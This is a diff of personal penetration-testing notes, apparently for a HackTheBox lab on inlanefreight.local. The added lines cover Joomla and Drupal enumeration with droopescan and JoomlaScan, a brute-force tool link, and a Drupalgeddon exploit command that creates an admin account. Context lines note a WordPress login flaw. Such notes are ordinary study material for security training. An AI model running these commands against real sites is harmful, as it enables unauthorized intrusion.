@@ -112,6 +112,29 @@ site.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27locat
 	- login with any valid user and anypassword => there is no validation for the password
 
 -----------------------------------------------------------------------------------------------------
+ sudo pip3 install droopescan
+droopescan scan joomla --url http://dev.inlanefreight.local/
+https://github.com/drego85/JoomlaScan
+hossamshady101@htb[/htb]$ sudo python2.7 -m pip install urllib3
+hossamshady101@htb[/htb]$ sudo python2.7 -m pip install certifi
+hossamshady101@htb[/htb]$ sudo python2.7 -m pip install bs4
+python2.7 joomlascan.py -u http://dev.inlanefreight.local
+https://github.com/ajnik/joomla-bruteforce	=>brute force 
+https://github.com/OWASP/joomscan
+
+
+--------------------------------------------------------------------------------------------------
+Drupal
+droopescan scan drupal -u http://drupal.inlanefreight.local
+https://www.exploit-db.com/exploits/44448
+python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/
+
+
+
+
+
+----------------------------------------------------------------------------------------------------------
 Automatic scanners 
 1- nuclei 
 	-nuclei -df httpx.txt -t /home/nuclei-templates -o nucleioutput
